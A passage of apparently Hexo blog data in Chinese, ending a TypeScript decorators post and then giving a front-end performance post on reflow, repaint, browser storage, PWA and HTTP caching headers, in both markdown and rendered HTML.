<span class=\"built_in\">Array</span>.from(<span class=\"built_in\">arguments</span>));</span><br><span class=\"line\">      <span class=\"keyword\">const</span> value = method.apply(<span class=\"keyword\">this</span>, <span class=\"built_in\">arguments</span>);</span><br><span class=\"line\">      <span class=\"built_in\">console</span>.log(<span class=\"string\">'result: '</span>, value);</span><br><span class=\"line\">      <span class=\"keyword\">return</span> value</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> B &#123;</span><br><span class=\"line\">  <span class=\"meta\">@f</span>()</span><br><span class=\"line\">  say(name: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> <span class=\"string\">`name is <span class=\"subst\">$&#123;name&#125;</span>`</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li><li><p>鉴权:</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">auth</span>(<span class=\"params\">user</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">target, key, descriptor</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> originalMethod = descriptor.value; <span class=\"comment\">// 保留原有函数</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!user.isAuth) &#123;</span><br><span class=\"line\">      descriptor.value = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123; <span class=\"comment\">// 未登录将返回提示</span></span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">'当前未登录，请登录!'</span>);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      descriptor.value = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">...args</span>) </span>&#123; <span class=\"comment\">// 已登录将原有函数</span></span><br><span class=\"line\">        originalMethod.apply(<span class=\"keyword\">this</span>, args);</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> descriptor;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@auth</span>(app.user)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">handleStar</span>(<span class=\"params\"><span class=\"keyword\">new</span></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">new</span>.like++;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li><li><p>类型检查</p><figure class=\"highlight ts\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> <span class=\"string\">\"reflect-metadata\"</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> stringMetaDataTag = <span class=\"string\">\"IsString\"</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">IsString</span>(<span class=\"params\">target: <span class=\"built_in\">Object</span>, propertyKey: <span class=\"built_in\">string</span> | symbol, parameterIndex: <span class=\"built_in\">number</span></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> existingRequiredParameters: <span class=\"built_in\">number</span>[] = Reflect.getOwnMetadata(stringMetaDataTag, target, propertyKey) || [];</span><br><span class=\"line\">  existingRequiredParameters.push(parameterIndex);</span><br><span class=\"line\">  Reflect.defineMetadata( stringMetaDataTag, existingRequiredParameters, target, propertyKey);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">validate</span>(<span class=\"params\">target: <span class=\"built_in\">any</span>, propertyName: <span class=\"built_in\">string</span>, descriptor: TypedPropertyDescriptor&lt;<span class=\"built_in\">Function</span>&gt;</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> method = descriptor.value!;</span><br><span class=\"line\"> </span><br><span class=\"line\">  descriptor.value = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">let</span> stringMetaTags: <span class=\"built_in\">number</span>[] = Reflect.getOwnMetadata(stringMetaDataTag, target, propertyName);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (stringMetaTags) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> parameterIndex of stringMetaTags) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">const</span> value = <span class=\"built_in\">arguments</span>[parameterIndex];</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!(value <span class=\"keyword\">instanceof</span> <span class=\"built_in\">String</span> || <span class=\"keyword\">typeof</span> value === <span class=\"string\">'string'</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">Error</span>(<span class=\"string\">'not string'</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> method.apply(<span class=\"keyword\">this</span>, <span class=\"built_in\">arguments</span>);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">class</span> A &#123;</span><br><span class=\"line\">    a: <span class=\"built_in\">string</span> = <span class=\"string\">'123'</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"meta\">@validate</span></span><br><span class=\"line\">    value (<span class=\"meta\">@IsString</span> value: <span class=\"built_in\">string</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(value);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.a = value;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id=\"写在最后\"><a href=\"#写在最后\" class=\"headerlink\" title=\"写在最后\"></a>写在最后</h2><p>\b笔者在 后台接口、Js Bridge、React 项目上都有实践过。不得不说，装饰器模式在面向切面编程(AOP)几乎是 “最佳实践”，极大的提升了编程效率。也希望这篇文章能帮助到你😊</p><h3 id=\"npm-包\"><a href=\"#npm-包\" class=\"headerlink\" title=\"npm 包\"></a>npm 包</h3><p><a href=\"https://github.com/typestack/class-validator\" target=\"_blank\" rel=\"noopener\">class-validator</a><br><a href=\"https://github.com/jayphelps/core-decorators\" target=\"_blank\" rel=\"noopener\">core-decorators</a><br><a href=\"https://github.com/nestjs/nest\" target=\"_blank\" rel=\"noopener\">Nest 后台框架</a></p><h3 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h3><p><a href=\"https://github.com/tc39/proposal-decorators\" target=\"_blank\" rel=\"noopener\">tc39-proposal</a><br><a href=\"https://www.typescriptlang.org/docs/handbook/decorators.html\" target=\"_blank\" rel=\"noopener\">typescript</a><br><a href=\"https://saul-mirone.github.io/a-complete-guide-to-typescript-decorator/\" target=\"_blank\" rel=\"noopener\">a-complete-guide-to-typescript-decorator</a></p>"},{"title":"前端性能优化","date":"2019-05-11T15:46:04.000Z","dir":"前端","keywords":"前端性能优化","_content":"### 资源合并与压缩-http请求的过程及潜在的性能优化\n浏览器的一个请求从发送到返回都经历了什么\n\n![http](page-process.png)\n\n思考\n* dns是否可以通过缓存减少dns查询时间？\n* 网络请求的过程走最近的网络环境？\n* 相同的静态资源是否可以缓存？\n* 能否减少请求http请求大小？\n* 减少http请求\n* 服务端渲染\n## 重绘和回流\n### css会让JavaScript变慢吗\n一个线程执行JavaScript\n一个线程执行渲染\n频繁触发重绘和回流，导致UI渲染频繁，最重导致js变慢\n### 啥是重绘和回流\n#### 回流\n* 当render tree中的一部分或全部因为元素规模尺寸，布局，隐藏等改变需要重新构建，称作为回流（reflow）\n* 当页面布局和几何属性变化时，就需要回流\n#### 重绘\n当render tree中的一些元素需要更新属性，而这些属性只是影响元素外观，风格，而不会影响布局的，比如background-color，则称之为重绘\n\n回流一定会重绘，重绘不一定会回流\n### 触发页面重布局的属性\n* 盒子模型相关属性会触发重布局\n* 定位属性及浮动会触发页面重布局\n* 改变节点内部文字结构会触发重布局\n```\nwidth\t\t\ttop\t\t\ttext-align\nheight\t\t\tbottom\t\toverflow-y\npadding\t\t\tleft\t\tfont-weight\nmargin\t\t\tright\t\toverflow\ndisplay\t\t\tposition\tfont-family\nborder-width\tfloat\t\tline-height\nborder\t\t\tclear\t\tvertical-align\nmin-height\t\t\t\t\twhite-space\n\t\t\t\t\t\t\tfont-size\n```\n### 触发页面重绘的属性\n```\ncolor\t\t\t\tborder-style\nborder-radius\t\tvisibility\ntext-decoration\t\tbackground\nbackground-image\tbackground-position\nbackground-repeat\tbackground-size\noutline-color\t\toutline\noutline-style\t\toutline-width\nbox-shadow\n```\n### 新建DOM过程\n1、 获取DOM后分割为多个图层\n2、 对每个图层的阶段计算样式结果(recalulate style --- 样式重计算)\n3、 为每个节点生成图形和位置(Layout--- 回流和重布局)\n4、 将每个节点绘制填充到图层位置中(Paint setup 和Paint --- 重绘)\n5、 图层作为纹理上传至gpu\n6、 符合多个图层到页面上生成最终屏幕图像(composite layers --- 图层重组)\n### 减少重绘和回流\n避免重绘回流的css\n将频繁重绘和回流的dom元素单独作为独立图层，那么这个dom元素只会影响这个独立图层\n### 如何将DOM创建一个新的图层\n1、3D或者透视变化CSS属性(perspective transform)\n2、 使用加速视屏解码的 video 节点\n3、拥有3D(webGL)上下文或加速的2D上下文的 canvas 节点\n4、混合插件(如flash)\n5、对自己的opacity做css动画或使用一个动画webkit变换的元素\n6、使用加速CSS过滤器的元素(translate3D..)\n7、元素有一个包含复合层的后代节点(一个元素拥有一个子元素，该元素在自己的层里)\n8、元素有一个z-index较低且包含一个符合层的兄弟元素(该元渲染在符合层上面渲染)\n\n### 避免重绘回流\n1、用translate替代top：top会触发回流而translate不会\n2、用opacity替代visibility：visibility会触发重绘而opacity不会\n3、不要一条条修改DOM修改样式，可以放在一个class内，替换class\n4、离线修改，使用display-none修改元素再显示\n5、不要把DOM节点属性值放在一个循环里的变量里（offsetHight， offsetWidth）\n6、不使用table布局，可能很小的修改导致整个table重新布局\n7、动画实现的速度的选择\n8、对于动画新建图层 (git图加上will-change, transform)\n9、使用GPU硬件加速(trasform: translateZ, trasform: transform3d(0,0,0))\n\n## localStorage\n* HTML5设计出来专门用于浏览器存储的\n* 大小为5M左右\n* 尽在客户端使用，不和服务端通信\n* 接口封装比较好\n* 浏览器本地缓存方案\n\n## SessionStorage\n* 会话级别的浏览器存储\n* 大小为5M左右\n* 仅在客户端使用，不和服务器端通信\n* 接口封装较好\n* 对于表单信息的维护\n\n## indexDB\n* IndexedDB 是一种低级API，用于客户端存储大量结构化数据(包括, 文件/ blobs)。该API使用索引来实现对该数据的高性能搜索。虽然 Web Storage 对于存储较少量的数据很有用，但对于存储更大量的结构化数据来说，这种方法不太有用。IndexedDB提供了一个解决方案。\n* 为应用创建离线版本\n\n## PWA\nProgressive Web App, 简称 PWA，是提升 Web App 的体验的一种新方法，能给用户原生应用的体验。\n\nPWA 能做到原生应用的体验不是靠特指某一项技术，而是经过应用一些新技术进行改进，在安全、性能和体验三个方面都有很大提升，PWA 本质上是 Web App，借助一些新技术也具备了 Native App 的一些特性，兼具 Web App 和 Native App 的优点。\n\nPWA 的主要特点包括下面三点：\n\n可靠 - 即使在不稳定的网络环境下，也能瞬间加载并展现\n体验 - 快速响应，并且有平滑的动画响应用户的操作\n粘性 - 像设备上的原生应用，具有沉浸式的用户体验，用户可以添加到桌面\nPWA 本身强调渐进式，并不要求一次性达到安全、性能和体验上的所有要求，开发者可以通过 PWA Checklist 查看现有的特征。\n\n## Service Worker\n1、使用拦截和处理网络请求能力，实现离线应用\n2、使用Service Worker在后台运行同时和页面通信的能力，趋势线大规模后台数据处理\n\n## 缓存\n### httpheader\n#### Cache-Control\n* max-age=\"seconds\"\n设置缓存存储的最大周期，超过这个时间缓存被认为过期(单位秒)。与Expires相反，时间是相对于请求的时间。\n* s-maxage=\"seconds\"\n覆盖max-age 或者 Expires 头，但是仅适用于共享缓存(比如各个代理)，并且私有缓存中它被忽略。\n* public\n表明响应可以被任何对象（包括：发送请求的客户端，代理服务器，等等）缓存。\n* private\n表明响应只能被单个用户缓存，不能作为共享缓存（即代理服务器不能缓存它）,可以缓存响应内容。\n* no-cache\n在发布缓存副本之前，强制高速缓存将请求提交给原始服务器进行验证。\n* no-store\n缓存不应存储有关客户端请求或服务器响应的任何内容。\n#### Expires\n* 缓存过期时间，用来指定资源到期时间，是服务器端的具体的时间点\n* 告诉浏览器在过期时间前浏览器可以直接从浏览器缓存去数据，无需再次请求\n#### Last-Modified/If-Modified-Since\n##### 特点\nThe Last-Modified  是一个响应首部，其中包含源头服务器认定的资源做出修改的日期及时间。 它通常被用作一个验证器来判断接收到的或者存储的资源是否彼此一致\n1、请求浏览器，给到缓存文件，response带有last-modified 给到浏览器存储为last-modified-since\n2、浏览器再次请求文件，带有last-modiied-since, 服务器对比last-modified，若过期则给到新的文件，若不过期，则继续使用本地文件\n##### 缺点\n1、某些服务器不能获取精确的修改时间\n2、文件修改时间改了，但文件内容却没有改变\n#### Etag/If-None-Match\n* 文件内容的hash值\n* etag——response header\n* if-none-match —— request header\n* 需要和cache-control一起使用\n```\n  ---------------------    \n\t\t\t\t\t\t   当浏览器本地没有缓存或者下一层失效时，或者用户点击刷新\n \\       200状态        /   浏览器直接去服务器下载最新数据\n \n   -------------------     \n\t\t\t\t\t\t   这一层由 last-modified / Etag 控制,当下一层失效时，\n   \\     304状态       /    或用户点击刷新，浏览器就会发送请求给服务器，如果文件无变\n\t\t\t\t\t\t   化则返回304\n     ----------------      \n\t\t\t\t\t       这层由expires/cache-control控制，expires(http 1.0     \n     \\ 200(from disk) /    有效)是绝对时间，cache-control(http1.1版有效)相对\n\t\t\t\t\t\t   时间，两者都存在，cache-control覆盖expires，没有失效\n       --------------      则直接访问自己缓存\n```\n![Alt text](font-end-cache.png)\n\n## 服务端性能优化\n### 多层次优化方案\n* 构建层模版编译\n* 数据无关prerender方式\n* 服务端渲染\n","source":"_posts/font-end-optimize.md","raw":"---\ntitle: 前端性能优化\ndate: 2019-05-11 23:46:04\ntags: 前端\ndir: 前端\nkeywords: 前端性能优化\n---\n### 资源合并与压缩-http请求的过程及潜在的性能优化\n浏览器的一个请求从发送到返回都经历了什么\n\n![http](page-process.png)\n\n思考\n* dns是否可以通过缓存减少dns查询时间？\n* 网络请求的过程走最近的网络环境？\n* 相同的静态资源是否可以缓存？\n* 能否减少请求http请求大小？\n* 减少http请求\n* 服务端渲染\n## 重绘和回流\n### css会让JavaScript变慢吗\n一个线程执行JavaScript\n一个线程执行渲染\n频繁触发重绘和回流，导致UI渲染频繁，最重导致js变慢\n### 啥是重绘和回流\n#### 回流\n* 当render tree中的一部分或全部因为元素规模尺寸，布局，隐藏等改变需要重新构建，称作为回流（reflow）\n* 当页面布局和几何属性变化时，就需要回流\n#### 重绘\n当render tree中的一些元素需要更新属性，而这些属性只是影响元素外观，风格，而不会影响布局的，比如background-color，则称之为重绘\n\n回流一定会重绘，重绘不一定会回流\n### 触发页面重布局的属性\n* 盒子模型相关属性会触发重布局\n* 定位属性及浮动会触发页面重布局\n* 改变节点内部文字结构会触发重布局\n```\nwidth\t\t\ttop\t\t\ttext-align\nheight\t\t\tbottom\t\toverflow-y\npadding\t\t\tleft\t\tfont-weight\nmargin\t\t\tright\t\toverflow\ndisplay\t\t\tposition\tfont-family\nborder-width\tfloat\t\tline-height\nborder\t\t\tclear\t\tvertical-align\nmin-height\t\t\t\t\twhite-space\n\t\t\t\t\t\t\tfont-size\n```\n### 触发页面重绘的属性\n```\ncolor\t\t\t\tborder-style\nborder-radius\t\tvisibility\ntext-decoration\t\tbackground\nbackground-image\tbackground-position\nbackground-repeat\tbackground-size\noutline-color\t\toutline\noutline-style\t\toutline-width\nbox-shadow\n```\n### 新建DOM过程\n1、 获取DOM后分割为多个图层\n2、 对每个图层的阶段计算样式结果(recalulate style --- 样式重计算)\n3、 为每个节点生成图形和位置(Layout--- 回流和重布局)\n4、 将每个节点绘制填充到图层位置中(Paint setup 和Paint --- 重绘)\n5、 图层作为纹理上传至gpu\n6、 符合多个图层到页面上生成最终屏幕图像(composite layers --- 图层重组)\n### 减少重绘和回流\n避免重绘回流的css\n将频繁重绘和回流的dom元素单独作为独立图层，那么这个dom元素只会影响这个独立图层\n### 如何将DOM创建一个新的图层\n1、3D或者透视变化CSS属性(perspective transform)\n2、 使用加速视屏解码的 video 节点\n3、拥有3D(webGL)上下文或加速的2D上下文的 canvas 节点\n4、混合插件(如flash)\n5、对自己的opacity做css动画或使用一个动画webkit变换的元素\n6、使用加速CSS过滤器的元素(translate3D..)\n7、元素有一个包含复合层的后代节点(一个元素拥有一个子元素，该元素在自己的层里)\n8、元素有一个z-index较低且包含一个符合层的兄弟元素(该元渲染在符合层上面渲染)\n\n### 避免重绘回流\n1、用translate替代top：top会触发回流而translate不会\n2、用opacity替代visibility：visibility会触发重绘而opacity不会\n3、不要一条条修改DOM修改样式，可以放在一个class内，替换class\n4、离线修改，使用display-none修改元素再显示\n5、不要把DOM节点属性值放在一个循环里的变量里（offsetHight， offsetWidth）\n6、不使用table布局，可能很小的修改导致整个table重新布局\n7、动画实现的速度的选择\n8、对于动画新建图层 (git图加上will-change, transform)\n9、使用GPU硬件加速(trasform: translateZ, trasform: transform3d(0,0,0))\n\n## localStorage\n* HTML5设计出来专门用于浏览器存储的\n* 大小为5M左右\n* 尽在客户端使用，不和服务端通信\n* 接口封装比较好\n* 浏览器本地缓存方案\n\n## SessionStorage\n* 会话级别的浏览器存储\n* 大小为5M左右\n* 仅在客户端使用，不和服务器端通信\n* 接口封装较好\n* 对于表单信息的维护\n\n## indexDB\n* IndexedDB 是一种低级API，用于客户端存储大量结构化数据(包括, 文件/ blobs)。该API使用索引来实现对该数据的高性能搜索。虽然 Web Storage 对于存储较少量的数据很有用，但对于存储更大量的结构化数据来说，这种方法不太有用。IndexedDB提供了一个解决方案。\n* 为应用创建离线版本\n\n## PWA\nProgressive Web App, 简称 PWA，是提升 Web App 的体验的一种新方法，能给用户原生应用的体验。\n\nPWA 能做到原生应用的体验不是靠特指某一项技术，而是经过应用一些新技术进行改进，在安全、性能和体验三个方面都有很大提升，PWA 本质上是 Web App，借助一些新技术也具备了 Native App 的一些特性，兼具 Web App 和 Native App 的优点。\n\nPWA 的主要特点包括下面三点：\n\n可靠 - 即使在不稳定的网络环境下，也能瞬间加载并展现\n体验 - 快速响应，并且有平滑的动画响应用户的操作\n粘性 - 像设备上的原生应用，具有沉浸式的用户体验，用户可以添加到桌面\nPWA 本身强调渐进式，并不要求一次性达到安全、性能和体验上的所有要求，开发者可以通过 PWA Checklist 查看现有的特征。\n\n## Service Worker\n1、使用拦截和处理网络请求能力，实现离线应用\n2、使用Service Worker在后台运行同时和页面通信的能力，趋势线大规模后台数据处理\n\n## 缓存\n### httpheader\n#### Cache-Control\n* max-age=\"seconds\"\n设置缓存存储的最大周期，超过这个时间缓存被认为过期(单位秒)。与Expires相反，时间是相对于请求的时间。\n* s-maxage=\"seconds\"\n覆盖max-age 或者 Expires 头，但是仅适用于共享缓存(比如各个代理)，并且私有缓存中它被忽略。\n* public\n表明响应可以被任何对象（包括：发送请求的客户端，代理服务器，等等）缓存。\n* private\n表明响应只能被单个用户缓存，不能作为共享缓存（即代理服务器不能缓存它）,可以缓存响应内容。\n* no-cache\n在发布缓存副本之前，强制高速缓存将请求提交给原始服务器进行验证。\n* no-store\n缓存不应存储有关客户端请求或服务器响应的任何内容。\n#### Expires\n* 缓存过期时间，用来指定资源到期时间，是服务器端的具体的时间点\n* 告诉浏览器在过期时间前浏览器可以直接从浏览器缓存去数据，无需再次请求\n#### Last-Modified/If-Modified-Since\n##### 特点\nThe Last-Modified  是一个响应首部，其中包含源头服务器认定的资源做出修改的日期及时间。 它通常被用作一个验证器来判断接收到的或者存储的资源是否彼此一致\n1、请求浏览器，给到缓存文件，response带有last-modified 给到浏览器存储为last-modified-since\n2、浏览器再次请求文件，带有last-modiied-since, 服务器对比last-modified，若过期则给到新的文件，若不过期，则继续使用本地文件\n##### 缺点\n1、某些服务器不能获取精确的修改时间\n2、文件修改时间改了，但文件内容却没有改变\n#### Etag/If-None-Match\n* 文件内容的hash值\n* etag——response header\n* if-none-match —— request header\n* 需要和cache-control一起使用\n```\n  ---------------------    \n\t\t\t\t\t\t   当浏览器本地没有缓存或者下一层失效时，或者用户点击刷新\n \\       200状态        /   浏览器直接去服务器下载最新数据\n \n   -------------------     \n\t\t\t\t\t\t   这一层由 last-modified / Etag 控制,当下一层失效时，\n   \\     304状态       /    或用户点击刷新，浏览器就会发送请求给服务器，如果文件无变\n\t\t\t\t\t\t   化则返回304\n     ----------------      \n\t\t\t\t\t       这层由expires/cache-control控制，expires(http 1.0     \n     \\ 200(from disk) /    有效)是绝对时间，cache-control(http1.1版有效)相对\n\t\t\t\t\t\t   时间，两者都存在，cache-control覆盖expires，没有失效\n       --------------      则直接访问自己缓存\n```\n![Alt text](font-end-cache.png)\n\n## 服务端性能优化\n### 多层次优化方案\n* 构建层模版编译\n* 数据无关prerender方式\n* 服务端渲染\n","slug":"font-end-optimize","published":1,"updated":"2021-10-13T15:41:25.643Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckuq8nz03000l4jzx9gw0x6zq","content":"<h3 id=\"资源合并与压缩-http请求的过程及潜在的性能优化\"><a href=\"#资源合并与压缩-http请求的过程及潜在的性能优化\" class=\"headerlink\" title=\"资源合并与压缩-http请求的过程及潜在的性能优化\"></a>资源合并与压缩-http请求的过程及潜在的性能优化</h3><p>浏览器的一个请求从发送到返回都经历了什么</p><p><img src=\"/img/loading.gif\" data-original=\"/前端/font-end-optimize/page-process.png\" alt=\"http\"></p><p>思考</p><ul><li>dns是否可以通过缓存减少dns查询时间？</li><li>网络请求的过程走最近的网络环境？</li><li>相同的静态资源是否可以缓存？</li><li>能否减少请求http请求大小？</li><li>减少http请求</li><li>服务端渲染<h2 id=\"重绘和回流\"><a href=\"#重绘和回流\" class=\"headerlink\" title=\"重绘和回流\"></a>重绘和回流</h2><h3 id=\"css会让JavaScript变慢吗\"><a href=\"#css会让JavaScript变慢吗\" class=\"headerlink\" title=\"css会让JavaScript变慢吗\"></a>css会让JavaScript变慢吗</h3>一个线程执行JavaScript<br>一个线程执行渲染<br>频繁触发重绘和回流，导致UI渲染频繁，最重导致js变慢<h3 id=\"啥是重绘和回流\"><a href=\"#啥是重绘和回流\" class=\"headerlink\" title=\"啥是重绘和回流\"></a>啥是重绘和回流</h3><h4 id=\"回流\"><a href=\"#回流\" class=\"headerlink\" title=\"回流\"></a>回流</h4></li><li>当render tree中的一部分或全部因为元素规模尺寸，布局，隐藏等改变需要重新构建，称作为回流（reflow）</li><li>当页面布局和几何属性变化时，就需要回流<h4 id=\"重绘\"><a href=\"#重绘\" class=\"headerlink\" title=\"重绘\"></a>重绘</h4>当render tree中的一些元素需要更新属性，而这些属性只是影响元素外观，风格，而不会影响布局的，比如background-color，则称之为重绘</li></ul><p>回流一定会重绘，重绘不一定会回流</p><h3 id=\"触发页面重布局的属性\"><a href=\"#触发页面重布局的属性\" class=\"headerlink\" title=\"触发页面重布局的属性\"></a>触发页面重布局的属性</h3><ul><li>盒子模型相关属性会触发重布局</li><li>定位属性及浮动会触发页面重布局</li><li>改变节点内部文字结构会触发重布局<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">width\t\t\ttop\t\t\ttext-align</span><br><span class=\"line\">height\t\t\tbottom\t\toverflow-y</span><br><span class=\"line\">padding\t\t\tleft\t\tfont-weight</span><br><span class=\"line\">margin\t\t\tright\t\toverflow</span><br><span class=\"line\">display\t\t\tposition\tfont-family</span><br><span class=\"line\">border-width\tfloat\t\tline-height</span><br><span class=\"line\">border\t\t\tclear\t\tvertical-align</span><br><span class=\"line\">min-height\t\t\t\t\twhite-space</span><br><span class=\"line\">\t\t\t\t\t\t\tfont-size</span><br></pre></td></tr></table></figure></li></ul><h3 id=\"触发页面重绘的属性\"><a href=\"#触发页面重绘的属性\" class=\"headerlink\" title=\"触发页面重绘的属性\"></a>触发页面重绘的属性</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">color\t\t\t\tborder-style</span><br><span class=\"line\">border-radius\t\tvisibility</span><br><span class=\"line\">text-decoration\t\tbackground</span><br><span class=\"line\">background-image\tbackground-position</span><br><span class=\"line\">background-repeat\tbackground-size</span><br><span class=\"line\">outline-color\t\toutline</span><br><span class=\"line\">outline-style\t\toutline-width</span><br><span class=\"line\">box-shadow</span><br></pre></td></tr></table></figure><h3 id=\"新建DOM过程\"><a href=\"#新建DOM过程\" class=\"headerlink\" title=\"新建DOM过程\"></a>新建DOM过程</h3><p>1、 获取DOM后分割为多个图层<br>2、 对每个图层的阶段计算样式结果(recalulate style — 样式重计算)<br>3、 为每个节点生成图形和位置(Layout— 回流和重布局)<br>4、 将每个节点绘制填充到图层位置中(Paint setup 和Paint — 重绘)<br>5、 图层作为纹理上传至gpu<br>6、 符合多个图层到页面上生成最终屏幕图像(composite layers — 图层重组)</p><h3 id=\"减少重绘和回流\"><a href=\"#减少重绘和回流\" class=\"headerlink\" title=\"减少重绘和回流\"></a>减少重绘和回流</h3><p>避免重绘回流的css<br>将频繁重绘和回流的dom元素单独作为独立图层，那么这个dom元素只会影响这个独立图层</p><h3 id=\"如何将DOM创建一个新的图层\"><a href=\"#如何将DOM创建一个新的图层\" class=\"headerlink\" title=\"如何将DOM创建一个新的图层\"></a>如何将DOM创建一个新的图层</h3><p>1、3D或者透视变化CSS属性(perspective transform)<br>2、 使用加速视屏解码的 video 节点<br>3、拥有3D(webGL)上下文或加速的2D上下文的 canvas 节点<br>4、混合插件(如flash)<br>5、对自己的opacity做css动画或使用一个动画webkit变换的元素<br>6、使用加速CSS过滤器的元素(translate3D..)<br>7、元素有一个包含复合层的后代节点(一个元素拥有一个子元素，该元素在自己的层里)<br>8、元素有一个z-index较低且包含一个符合层的兄弟元素(该元渲染在符合层上面渲染)</p><h3 id=\"避免重绘回流\"><a href=\"#避免重绘回流\" class=\"headerlink\" title=\"避免重绘回流\"></a>避免重绘回流</h3><p>1、用translate替代top：top会触发回流而translate不会<br>2、用opacity替代visibility：visibility会触发重绘而opacity不会<br>3、不要一条条修改DOM修改样式，可以放在一个class内，替换class<br>4、离线修改，使用display-none修改元素再显示<br>5、不要把DOM节点属性值放在一个循环里的变量里（offsetHight， offsetWidth）<br>6、不使用table布局，可能很小的修改导致整个table重新布局<br>7、动画实现的速度的选择<br>8、对于动画新建图层 (git图加上will-change, transform)<br>9、使用GPU硬件加速(trasform: translateZ, trasform: transform3d(0,0,0))</p><h2 id=\"localStorage\"><a href=\"#localStorage\" class=\"headerlink\" title=\"localStorage\"></a>localStorage</h2><ul><li>HTML5设计出来专门用于浏览器存储的</li><li>大小为5M左右</li><li>尽在客户端使用，不和服务端通信</li><li>接口封装比较好</li><li>浏览器本地缓存方案</li></ul><h2 